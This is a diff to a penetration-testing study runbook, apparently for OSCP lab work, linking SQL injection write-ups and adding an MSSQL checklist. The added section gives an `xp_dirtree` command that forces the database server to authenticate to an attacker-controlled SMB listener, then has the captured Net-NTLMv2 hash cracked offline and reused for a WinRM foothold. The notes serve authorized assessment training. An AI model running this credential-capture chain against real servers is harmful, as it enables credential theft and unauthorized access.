@@ -93,3 +93,12 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- numeric SQLi, manual UNION extraction, and MariaDB `INTO OUTFILE` webshell delivery
 - [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- Magento Shoplift SQLi used to create a controlled administrative account
 - [[OSCP/BOXES/WRITE UPS/Linux/Cockpit|Cockpit]] -- demonstrates a WAF-bypass operator and SQLi-driven credential recovery
+
+### MSSQL login is valid but `xp_cmdshell` is denied
+
+→ Check `SELECT IS_SRVROLEMEMBER('sysadmin')` and record the negative result
+→ Do not enable `xp_cmdshell` unless the current login is authorized as sysadmin and the route requires it
+→ Start an authorized SMB capture listener, then issue `EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;`
+→ Save the Net-NTLMv2 response privately and crack it offline with John or Hashcat
+→ Map the captured service identity to the cracked password, validate it over the evidence-backed service, and open [[OSCP/RUNBOOK V2/AD - WinRM Foothold|AD WinRM Foothold]] if WinRM succeeds
+→ See [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]] and [[OSCP/COMMAND BREAKDOWNS/SQL Injection (Breakdowns)|SQL Injection breakdowns]]
